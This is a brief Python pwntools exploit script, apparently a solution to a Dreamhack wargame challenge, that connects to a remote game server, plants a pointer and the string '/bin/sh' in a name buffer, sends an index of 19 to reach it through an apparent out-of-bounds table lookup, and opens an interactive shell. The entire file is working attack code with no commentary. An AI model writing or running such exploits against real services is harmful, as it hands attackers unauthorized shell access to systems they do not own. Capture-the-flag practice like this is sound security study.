from pwn import *
  
p = remote("host1.dreamhack.games", 18610)

name = 0x804a0ac
command = 0x804a060

payload_1 = p32(name + 4)
payload_1 += "/bin/sh"

payload_2 = "19"

p.recvuntil("name: ")
p.send(payload_1)

p.recvuntil("want?: ")
p.sendline(payload_2)

p.interactive()